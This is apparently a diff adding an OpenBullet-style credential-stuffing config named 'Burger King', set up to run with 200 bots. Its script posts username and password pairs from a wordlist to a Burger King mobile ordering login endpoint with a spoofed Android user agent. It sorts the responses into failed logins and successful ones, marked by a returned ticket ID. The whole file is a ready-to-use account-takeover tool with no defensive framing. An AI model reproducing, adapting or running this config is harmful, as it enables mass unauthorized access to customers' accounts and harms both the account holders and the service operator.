@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "Burger King",
+  "SuggestedBots": 200,
+  "LastModified": "2018-05-27T07:59:56.9224369+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://bkm-us-prod-ord-app.tillster.com/ordering-loyalty-aggregation-service/tenants/bk-mobile/session" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"userType\":\"TILLSTER_USER\",\"requestId\":\"47bb0c03-aed9-4ca2-99c2-6f391a65eaef\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.1.1; CPH1725 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Crosswalk/16.45.421.19 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: https://bkm-us-prod-ord-app.tillster.com" 
+  HEADER "Origin: file://" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "unable to login" 
+  KEYCHAIN Success OR 
+    KEY "{\"ticketId\":\"" 
